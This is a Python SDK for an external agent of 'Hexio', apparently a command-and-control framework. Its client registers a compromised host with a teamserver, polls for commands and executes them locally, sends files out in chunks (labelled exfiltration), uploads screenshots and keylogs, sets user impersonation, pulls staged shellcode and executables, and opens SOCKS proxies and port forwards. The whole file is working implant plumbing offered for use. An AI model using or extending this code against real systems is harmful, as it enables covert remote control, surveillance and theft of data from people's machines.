"""
Hexio External Agent SDK for Python.

Usage:
    from hexio_sdk import HexioClient

    client = HexioClient("http://10.0.0.1:9000", "my-passphrase")
    reg = client.register(
        hostname="WORKSTATION",
        ip="10.0.0.50",
        user="admin",
        os_info="Windows 10",
        process="myagent.exe",
        arch="x64",
        pid=1234,
        client_type="my_agent",
        sleep_time=5,
    )
    # client.token and client.agent_id are now set

    while True:
        checkin = client.checkin()
        for cmd in checkin["commands"]:
            output = execute_locally(cmd["command"])
            client.command_response(cmd["id"], cmd["command"], output)
        time.sleep(5)
"""

import json
import base64
from dataclasses import dataclass, field
from typing import Optional, List, Dict, Any
from urllib.request import Request, urlopen
from urllib.error import HTTPError


class HexioAPIError(Exception):
    def __init__(self, status_code: int, message: str):
        self.status_code = status_code
        self.message = message
        super().__init__(f"API error ({status_code}): {message}")


# --- Sync batch dataclasses ---
#
# Each dataclass mirrors the Go SDK types in /go/hexio_sdk.go and the JSON
# shapes defined in APISPEC.md. `to_dict()` strips None / empty collections
# so only explicitly-set fields are included on the wire.


def _strip(d: Dict[str, Any]) -> Dict[str, Any]:
    out = {}
    for k, v in d.items():
        if v is None:
            continue
        if isinstance(v, (list, dict)) and len(v) == 0:
            continue
        out[k] = v
    return out


@dataclass
class SleepUpdate:
    sleep_time: Optional[int] = None
    sleep_jitter: Optional[int] = None

    def to_dict(self) -> Dict[str, Any]:
        d: Dict[str, Any] = {}
        if self.sleep_time is not None:
            d["sleep_time"] = self.sleep_time
        if self.sleep_jitter is not None:
            d["sleep_jitter"] = self.sleep_jitter
        return d


@dataclass
class CommandResult:
    command_id: int
    command: str
    response: str

    def to_dict(self) -> Dict[str, Any]:
        return {
            "command_id": self.command_id,
            "command": self.command,
            "response": self.response,
        }


@dataclass
class SideChannelResponse:
    channel_id: str
    data: str

    def to_dict(self) -> Dict[str, Any]:
        return {"channel_id": self.channel_id, "data": self.data}


@dataclass
class DownloadInitRequest:
    file_name: str
    agent_path: str
    file_size: int
    chunk_size: int
    total_chunks: int

    def to_dict(self) -> Dict[str, Any]:
        return {
            "file_name": self.file_name,
            "agent_path": self.agent_path,
            "file_size": self.file_size,
            "chunk_size": self.chunk_size,
            "total_chunks": self.total_chunks,
        }


@dataclass
class DownloadChunkUpload:
    download_id: str
    chunk_data: str

    def to_dict(self) -> Dict[str, Any]:
        return {"download_id": self.download_id, "chunk_data": self.chunk_data}


@dataclass
class ScreenshotUpload:
    filename: str
    data: str

    def to_dict(self) -> Dict[str, Any]:
        return {"filename": self.filename, "data": self.data}


@dataclass
class KeylogUpload:
    filename: str
    data: str

    def to_dict(self) -> Dict[str, Any]:
        return {"filename": self.filename, "data": self.data}


@dataclass
class SocksReceive:
    id: str
    data: str

    def to_dict(self) -> Dict[str, Any]:
        return {"id": self.id, "data": self.data}


@dataclass
class SocksSyncRequest:
    closes: List[str] = field(default_factory=list)
    receives: List[SocksReceive] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        d: Dict[str, Any] = {}
        if self.closes:
            d["closes"] = list(self.closes)
        if self.receives:
            d["receives"] = [r.to_dict() for r in self.receives]
        return d


@dataclass
class SocksOpenEntry:
    id: str
    addr: str
    port: int
    proto: str

    @classmethod
    def from_dict(cls, d: Dict[str, Any]) -> "SocksOpenEntry":
        return cls(
            id=d.get("id", ""),
            addr=d.get("addr", ""),
            port=int(d.get("port", 0)),
            proto=d.get("proto", ""),
        )


@dataclass
class SocksSend:
    id: str
    data: str
    size: int

    @classmethod
    def from_dict(cls, d: Dict[str, Any]) -> "SocksSend":
        return cls(
            id=d.get("id", ""),
            data=d.get("data", ""),
            size=int(d.get("size", 0)),
        )


@dataclass
class SocksSyncResponse:
    opens: List[SocksOpenEntry] = field(default_factory=list)
    closes: List[str] = field(default_factory=list)
    send: List[SocksSend] = field(default_factory=list)  # note: singular

    @classmethod
    def from_dict(cls, d: Dict[str, Any]) -> "SocksSyncResponse":
        return cls(
            opens=[SocksOpenEntry.from_dict(x) for x in (d.get("opens") or [])],
            closes=list(d.get("closes") or []),
            send=[SocksSend.from_dict(x) for x in (d.get("send") or [])],
        )


@dataclass
class PortFwdOpenRequest:
    port: int
    remote_host: str
    remote_port: int

    def to_dict(self) -> Dict[str, Any]:
        return {
            "port": self.port,
            "remote_host": self.remote_host,
            "remote_port": self.remote_port,
        }


@dataclass
class PortFwdSend:
    sockid: str
    data: str
    size: int

    def to_dict(self) -> Dict[str, Any]:
        return {"sockid": self.sockid, "data": self.data, "size": self.size}


@dataclass
class PortFwdInboundData:
    opens: List[str] = field(default_factory=list)
    sends: List[PortFwdSend] = field(default_factory=list)
    closes: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        d: Dict[str, Any] = {}
        if self.opens:
            d["opens"] = list(self.opens)
        if self.sends:
            d["sends"] = [s.to_dict() for s in self.sends]
        if self.closes:
            d["closes"] = list(self.closes)
        return d


@dataclass
class PortFwdSyncRequestEntry:
    port: int
    data: PortFwdInboundData = field(default_factory=PortFwdInboundData)

    def to_dict(self) -> Dict[str, Any]:
        return {"port": self.port, "data": self.data.to_dict()}


@dataclass
class PortFwdRecv:
    sockid: str
    data: str
    size: int

    @classmethod
    def from_dict(cls, d: Dict[str, Any]) -> "PortFwdRecv":
        return cls(
            sockid=d.get("sockid", ""),
            data=d.get("data", ""),
            size=int(d.get("size", 0)),
        )


@dataclass
class PortFwdOutboundData:
    recvs: List[PortFwdRecv] = field(default_factory=list)
    closes: List[str] = field(default_factory=list)

    @classmethod
    def from_dict(cls, d: Dict[str, Any]) -> "PortFwdOutboundData":
        return cls(
            recvs=[PortFwdRecv.from_dict(x) for x in (d.get("recvs") or [])],
            closes=list(d.get("closes") or []),
        )


@dataclass
class PortFwdSyncResponseEntry:
    port: int
    data: PortFwdOutboundData = field(default_factory=PortFwdOutboundData)

    @classmethod
    def from_dict(cls, d: Dict[str, Any]) -> "PortFwdSyncResponseEntry":
        return cls(
            port=int(d.get("port", 0)),
            data=PortFwdOutboundData.from_dict(d.get("data") or {}),
        )


@dataclass
class DownloadChunkAck:
    download_id: str
    chunk_received: bool

    @classmethod
    def from_dict(cls, d: Dict[str, Any]) -> "DownloadChunkAck":
        return cls(
            download_id=d.get("download_id", ""),
            chunk_received=bool(d.get("chunk_received", False)),
        )


@dataclass
class DownloadInitResponse:
    agent_path: str
    download_id: str

    @classmethod
    def from_dict(cls, d: Dict[str, Any]) -> "DownloadInitResponse":
        return cls(
            agent_path=d.get("agent_path", ""),
            download_id=d.get("download_id", ""),
        )


@dataclass
class PortFwdOpCloseResult:
    port: int
    success: bool

    @classmethod
    def from_dict(cls, d: Dict[str, Any]) -> "PortFwdOpCloseResult":
        return cls(
            port=int(d.get("port", 0)),
            success=bool(d.get("success", False)),
        )


@dataclass
class StagedFile:
    filename: str
    filetype: str
    alias: str
    filedata: str

    @classmethod
    def from_dict(cls, d: Dict[str, Any]) -> "StagedFile":
        return cls(
            filename=d.get("filename", ""),
            filetype=d.get("filetype", ""),
            alias=d.get("alias", ""),
            filedata=d.get("filedata", ""),
        )


@dataclass
class Command:
    id: int
    command: str

    @classmethod
    def from_dict(cls, d: Dict[str, Any]) -> "Command":
        return cls(id=int(d.get("id", 0)), command=d.get("command", ""))


@dataclass
class SyncRequest:
    """
    Full batched payload for POST /agent/sync. All fields are optional; only
    set the ones you need.

    For `socks_open` / `socks_close`, set the corresponding flag to True to
    include the (empty-object) key in the request -- presence of the key is
    what triggers the operation server-side.
    """
    sleep: Optional[SleepUpdate] = None
    impersonation: Optional[str] = None
    commands: List[CommandResult] = field(default_factory=list)
    side_channel_responses: List[SideChannelResponse] = field(default_factory=list)
    download_init: List[DownloadInitRequest] = field(default_factory=list)
    download_chunk: List[DownloadChunkUpload] = field(default_factory=list)
    download_cancel: List[str] = field(default_factory=list)
    screenshots: List[ScreenshotUpload] = field(default_factory=list)
    keylog: Optional[KeylogUpload] = None
    bof_files: List[str] = field(default_factory=list)
    pe_files: List[str] = field(default_factory=list)
    dll_files: List[str] = field(default_factory=list)
    elf_files: List[str] = field(default_factory=list)
    macho_files: List[str] = field(default_factory=list)
    shellcode_files: List[str] = field(default_factory=list)
    hexlang: List[str] = field(default_factory=list)
    socks_open: bool = False
    socks_open_port: Optional[int] = None
    socks_close: bool = False
    socks_sync: Optional[SocksSyncRequest] = None
    portfwd_open: List[PortFwdOpenRequest] = field(default_factory=list)
    portfwd_close: List[int] = field(default_factory=list)
    portfwd_sync: List[PortFwdSyncRequestEntry] = field(default_factory=list)

    def trigger_socks_open(self) -> None:
        self.socks_open = True

    def trigger_socks_close(self) -> None:
        self.socks_close = True

    def to_dict(self) -> Dict[str, Any]:
        d: Dict[str, Any] = {}
        if self.sleep is not None:
            sleep_d = self.sleep.to_dict()
            if sleep_d:
                d["sleep"] = sleep_d
        if self.impersonation is not None:
            # empty string is meaningful (clears impersonation); keep as-is
            d["impersonation"] = self.impersonation
        if self.commands:
            d["commands"] = [c.to_dict() for c in self.commands]
        if self.side_channel_responses:
            d["side_channel_responses"] = [s.to_dict() for s in self.side_channel_responses]
        if self.download_init:
            d["download_init"] = [x.to_dict() for x in self.download_init]
        if self.download_chunk:
            d["download_chunk"] = [x.to_dict() for x in self.download_chunk]
        if self.download_cancel:
            d["download_cancel"] = list(self.download_cancel)
        if self.screenshots:
            d["screenshots"] = [s.to_dict() for s in self.screenshots]
        if self.keylog is not None:
            d["keylog"] = self.keylog.to_dict()
        if self.bof_files:
            d["bof_files"] = list(self.bof_files)
        if self.pe_files:
            d["pe_files"] = list(self.pe_files)
        if self.dll_files:
            d["dll_files"] = list(self.dll_files)
        if self.elf_files:
            d["elf_files"] = list(self.elf_files)
        if self.macho_files:
            d["macho_files"] = list(self.macho_files)
        if self.shellcode_files:
            d["shellcode_files"] = list(self.shellcode_files)
        if self.hexlang:
            d["hexlang"] = list(self.hexlang)
        if self.socks_open:
            d["socks_open"] = {}
        if self.socks_open_port is not None:
            d["socks_open_port"] = self.socks_open_port
        if self.socks_close:
            d["socks_close"] = {}
        if self.socks_sync is not None:
            ss = self.socks_sync.to_dict()
            # Include the key even if both subfields are empty; presence alone
            # is not meaningful here (unlike socks_open), but mirrors Go
            # omitempty: only emit if something is set.
            if ss:
                d["socks_sync"] = ss
        if self.portfwd_open:
            d["portfwd_open"] = [p.to_dict() for p in self.portfwd_open]
        if self.portfwd_close:
            d["portfwd_close"] = list(self.portfwd_close)
        if self.portfwd_sync:
            d["portfwd_sync"] = [p.to_dict() for p in self.portfwd_sync]
        return d


@dataclass
class SyncResponse:
    commands: List[Command] = field(default_factory=list)
    files: List[StagedFile] = field(default_factory=list)
    download_init: List[DownloadInitResponse] = field(default_factory=list)
    download_chunk: List[DownloadChunkAck] = field(default_factory=list)
    bof_files: Dict[str, str] = field(default_factory=dict)
    pe_files: Dict[str, str] = field(default_factory=dict)
    dll_files: Dict[str, str] = field(default_factory=dict)
    elf_files: Dict[str, str] = field(default_factory=dict)
    macho_files: Dict[str, str] = field(default_factory=dict)
    shellcode_files: Dict[str, str] = field(default_factory=dict)
    hexlang: Dict[str, str] = field(default_factory=dict)
    socks_open: Optional[bool] = None
    socks_port: Optional[int] = None
    socks_close: Optional[bool] = None
    socks_sync: Optional[SocksSyncResponse] = None
    portfwd_open: List[PortFwdOpCloseResult] = field(default_factory=list)
    portfwd_close: List[PortFwdOpCloseResult] = field(default_factory=list)
    portfwd_sync: List[PortFwdSyncResponseEntry] = field(default_factory=list)
    raw: Dict[str, Any] = field(default_factory=dict)

    @classmethod
    def from_dict(cls, d: Dict[str, Any]) -> "SyncResponse":
        if d is None:
            d = {}
        resp = cls(raw=d)
        resp.commands = [Command.from_dict(x) for x in (d.get("commands") or [])]
        resp.files = [StagedFile.from_dict(x) for x in (d.get("files") or [])]
        resp.download_init = [
            DownloadInitResponse.from_dict(x) for x in (d.get("download_init") or [])
        ]
        resp.download_chunk = [
            DownloadChunkAck.from_dict(x) for x in (d.get("download_chunk") or [])
        ]
        resp.bof_files = dict(d.get("bof_files") or {})
        resp.pe_files = dict(d.get("pe_files") or {})
        resp.dll_files = dict(d.get("dll_files") or {})
        resp.elf_files = dict(d.get("elf_files") or {})
        resp.macho_files = dict(d.get("macho_files") or {})
        resp.shellcode_files = dict(d.get("shellcode_files") or {})
        resp.hexlang = dict(d.get("hexlang") or {})
        if "socks_open" in d:
            resp.socks_open = bool(d.get("socks_open"))
        if "socks_port" in d and d.get("socks_port") is not None:
            resp.socks_port = int(d.get("socks_port"))
        if "socks_close" in d:
            resp.socks_close = bool(d.get("socks_close"))
        if d.get("socks_sync") is not None:
            resp.socks_sync = SocksSyncResponse.from_dict(d.get("socks_sync") or {})
        resp.portfwd_open = [
            PortFwdOpCloseResult.from_dict(x) for x in (d.get("portfwd_open") or [])
        ]
        resp.portfwd_close = [
            PortFwdOpCloseResult.from_dict(x) for x in (d.get("portfwd_close") or [])
        ]
        resp.portfwd_sync = [
            PortFwdSyncResponseEntry.from_dict(x) for x in (d.get("portfwd_sync") or [])
        ]
        return resp


class HexioClient:
    def __init__(self, base_url: str, passphrase: str):
        self.base_url = base_url.rstrip("/")
        self.passphrase = passphrase
        self.token: Optional[str] = None
        self.agent_id: Optional[int] = None

    def _request(self, method: str, path: str, body=None) -> dict:
        url = self.base_url + path
        data = None
        if body is not None:
            data = json.dumps(body).encode("utf-8")

        req = Request(url, data=data, method=method)
        req.add_header("HexioExternalAgentAuth", self.passphrase)
        if self.token:
            req.add_header("HexioAgentToken", self.token)
        if data is not None:
            req.add_header("Content-Type", "application/json")

        try:
            with urlopen(req) as resp:
                resp_data = resp.read().decode("utf-8")
                if resp_data:
                    return json.loads(resp_data)
                return {}
        except HTTPError as e:
            error_body = e.read().decode("utf-8")
            try:
                err = json.loads(error_body)
                raise HexioAPIError(e.code, err.get("error", error_body))
            except json.JSONDecodeError:
                raise HexioAPIError(e.code, error_body)

    # --- Registration ---

    def register(
        self,
        hostname: str,
        ip: str,
        user: str,
        os_info: str,
        process: str,
        pid: int,
        arch: str,
        client_type: str,
        sleep_time: int = 0,
    ) -> dict:
        resp = self._request("POST", "/register", {
            "hostname": hostname,
            "ip": ip,
            "user": user,
            "os": os_info,
            "process": process,
            "pid": pid,
            "client_type": client_type,
            "sleep_time": sleep_time,
            "arch": arch,
        })
        self.token = resp["token"]
        self.agent_id = resp["agent_id"]
        return resp

    # --- Checkin / Sync ---

    def checkin(self) -> dict:
        return self._request("GET", "/agent/checkin")

    def sync(self, req: Optional[SyncRequest] = None) -> SyncResponse:
        """
        Full batched POST /agent/sync. If req is None, posts an empty body and
        behaves like /agent/checkin (only retrieves queued commands + staged
        files). Otherwise serializes req.to_dict() and posts it.

        Returns a SyncResponse dataclass; raw JSON is preserved on `.raw`.
        """
        body: Optional[dict] = None
        if req is not None:
            payload = req.to_dict()
            if payload:
                body = payload
        raw = self._request("POST", "/agent/sync", body)
        return SyncResponse.from_dict(raw or {})

    # --- Command Response ---

    def command_response(self, command_id: int, command: str, response: str) -> dict:
        return self._request("POST", "/agent/command/response", {
            "command_id": command_id,
            "command": command,
            "response": response,
        })

    # --- Downloads (exfiltration) ---

    def download_init(
        self,
        file_name: str,
        agent_path: str,
        file_size: int,
        chunk_size: int,
        total_chunks: int,
    ) -> dict:
        return self._request("POST", "/agent/download/init", {
            "file_name": file_name,
            "agent_path": agent_path,
            "file_size": file_size,
            "chunk_size": chunk_size,
            "total_chunks": total_chunks,
        })

    def download_chunk(self, download_id: str, chunk_data: bytes) -> dict:
        return self._request("POST", "/agent/download/chunk", {
            "download_id": download_id,
            "chunk_data": base64.b64encode(chunk_data).decode("utf-8"),
        })

    def download_cancel(self, download_id: str) -> dict:
        return self._request("POST", "/agent/download/cancel", {
            "download_id": download_id,
        })

    def download_file(self, file_path: str, file_data: bytes, chunk_size: int = 65536) -> str:
        """Convenience: download a complete file in one call."""
        file_name = file_path.replace("\\", "/").split("/")[-1]
        total_chunks = (len(file_data) + chunk_size - 1) // chunk_size

        init = self.download_init(file_name, file_path, len(file_data), chunk_size, total_chunks)
        download_id = init["download_id"]

        for i in range(total_chunks):
            chunk = file_data[i * chunk_size : (i + 1) * chunk_size]
            self.download_chunk(download_id, chunk)

        return download_id

    # --- Screenshot ---

    def screenshot(self, filename: str, image_data: bytes) -> dict:
        return self._request("POST", "/agent/screenshot", {
            "filename": filename,
            "data": base64.b64encode(image_data).decode("utf-8"),
        })

    # --- Keylog ---

    def keylog(self, filename: str, data: str) -> dict:
        return self._request("POST", "/agent/keylog", {
            "filename": filename,
            "data": data,
        })

    # --- Impersonation ---

    def set_impersonation(self, user: str) -> dict:
        return self._request("POST", "/agent/impersonation", {"user": user})

    def clear_impersonation(self) -> dict:
        return self.set_impersonation("")

    # --- Sidechannel ---

    def sidechannel(self, channel_id: str, data_b64: str) -> dict:
        return self._request("POST", "/agent/sidechannel", {
            "channel_id": channel_id,
            "data": data_b64,
        })

    # --- File Requests ---

    def request_files(
        self,
        bof_files: Optional[list] = None,
        pe_files: Optional[list] = None,
        dll_files: Optional[list] = None,
        elf_files: Optional[list] = None,
        macho_files: Optional[list] = None,
        shellcode_files: Optional[list] = None,
        hexlang: Optional[list] = None,
    ) -> dict:
        payload = {}
        if bof_files:
            payload["bof_files"] = bof_files
        if pe_files:
            payload["pe_files"] = pe_files
        if dll_files:
            payload["dll_files"] = dll_files
        if elf_files:
            payload["elf_files"] = elf_files
        if macho_files:
            payload["macho_files"] = macho_files
        if shellcode_files:
            payload["shellcode_files"] = shellcode_files
        if hexlang:
            payload["hexlang"] = hexlang
        return self._request("POST", "/agent/files/request", payload)

    # --- SOCKS Proxy ---

    def socks_open(self, port: Optional[int] = None) -> dict:
        payload = {}
        if port is not None:
            payload["port"] = port
        return self._request("POST", "/agent/socks/open", payload)

    def socks_close(self) -> dict:
        return self._request("POST", "/agent/socks/close", {})

    def socks_sync(self, data) -> dict:
        return self._request("POST", "/agent/socks/sync", data)

    # --- Port Forward ---

    def portfwd_open(self, port: int, remote_host: str, remote_port: int) -> dict:
        return self._request("POST", "/agent/portfwd/open", {
            "port": port,
            "remote_host": remote_host,
            "remote_port": remote_port,
        })

    def portfwd_close(self, port: int) -> dict:
        return self._request("POST", "/agent/portfwd/close", {"port": port})

    def portfwd_sync(self, data) -> dict:
        return self._request("POST", "/agent/portfwd/sync", data)
